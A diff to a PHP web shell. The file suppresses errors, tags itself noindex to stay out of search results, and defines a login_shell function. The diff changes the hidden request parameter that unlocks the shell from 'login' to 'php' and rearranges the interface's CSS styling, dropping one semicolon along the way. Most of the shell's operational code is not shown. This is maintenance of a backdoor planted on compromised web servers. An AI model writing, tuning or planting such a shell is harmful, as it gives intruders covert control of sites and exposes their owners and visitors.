@@ -3,7 +3,6 @@
 session_start();
 @error_reporting(0);
 @set_time_limit(0);
-
 if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 	@set_magic_quotes_runtime(0);
 }
@@ -26,7 +25,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 function login_shell() {
 ?>
 <?php
-if(isset($_REQUEST['login'])){
+if(isset($_REQUEST['php'])){
 	    echo "<title>awokwokwok</title>";
 	    echo "<br>";
         echo "<pre>";
@@ -77,19 +76,9 @@ if(get_magic_quotes_gpc()) {
 <meta name="robots" content="noindex">
 <meta name="googlebot" content="noindex">
 <style type='text/css'>
+@import url(https://fonts.googleapis.com/css?family=Ubuntu);
 @import url(https://fonts.googleapis.com/css?family=Abel);
 @import url(http://fonts.googleapis.com/css?family=Iceberg);
-table, th, td {border-collapse:collapse;font-family: Tahoma, Geneva, sans-serif;background: transparent;font-family: 'Iceberg';font-size: 13px;}
-input[type=text], input[type=password],input[type=submit] {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;
-font-family: 'Abel';font-size: 13px;}
-textarea {border: 1px solid #ffffff;width: 99.5%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Abel';font-size: 13px;}
-select {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
-.but {background: transparent;color: #ffffff;border: 1px solid #ffffff;margin: 5px auto;padding-left: 5px;font-family: 'Abel';font-size: 13px;}
-li a:hover{text-shadow: 0pt 0pt 0.99em lime, 0pt 0pt 0.99em lime;color: #00ff00;text-decoration: none;}
-ul {margin:0; padding:0;}
-</style>
-<style type='text/css'>
-@import url(https://fonts.googleapis.com/css?family=Ubuntu);
 hr {
     border:0;
     height:1px;
@@ -117,6 +106,12 @@ li {
 	margin: 5px;
 	padding: 5px;
 }
+
+ li a:hover { 
+    text-shadow: 0pt 0pt 0.99em gold, 0pt 0pt 0.99em gold;
+    color: gold;
+    text-decoration: underline;
+ }
 
 .footer {
 	text-align: center;
@@ -160,10 +155,11 @@ pre {
 }
 
 table, th, td {
-	border-collapse:collapse;
-	background: transparent;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+    border-collapse:collapse;
+    font-family: Tahoma, Geneva, sans-serif;
+    background: transparent
+    font-family: 'Iceberg';
+    font-size: 13px;
 }
 
 .table_home, .th_home, .td_home {
@@ -193,13 +189,13 @@ tr:hover {
 	color: #ffffff;
 }
 
-input[type=text], input[type=password], .input {
-	background: transparent; 
-	color: #ffffff;
-	border: 1px solid #ffffff;
-	padding: 3px;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+ input[type=text], input[type=password],input[type=submit] {
+     background: transparent;
+     color: #ffffff;
+     border: 1px solid #ffffff;
+     margin: 5px auto;
+     padding-left: 5px;
+     font-family: 'Abel';font-size: 13px;
 }
 
 input[type=submit] {
@@ -215,17 +211,37 @@ input:focus, textarea:focus {
 }
 
 textarea {
-	border: 1px solid #ffffff;
-	width: 99.5%;
-	height: 400px;
-	padding-left: 5px;
-	margin: 10px auto;
-	resize: none;
-	background: transparent;
-	color: #ffffff;
-	font-family: 'Ubuntu';
-	font-size: 13px;
+    border: 1px solid #ffffff;
+    width: 99.5%;
+    height: 400px;
+    padding-left: 5px;
+    margin: 10px auto;
+    resize: none;
+    background: transparent;
+    color: #ffffff;
+    font-family: 'Abel';
+    font-size: 13px;
 }
+
+select {
+    background: transparent;
+    color: #ffffff;
+    border: 1px solid #ffffff;
+    margin: 5px auto;
+    padding-left: 5px;
+    font-family: 'Abel';
+    font-size: 13px;
+}
+
+.but {
+    background: transparent;
+    color: #ffffff;
+    border: 1px solid #ffffff;
+    margin: 5px auto;
+    padding-left: 5px;
+    font-family: 'Abel';font-size: 13px;
+}
+
 iframe {
 	width: 100%;
 	min-height: 500px;
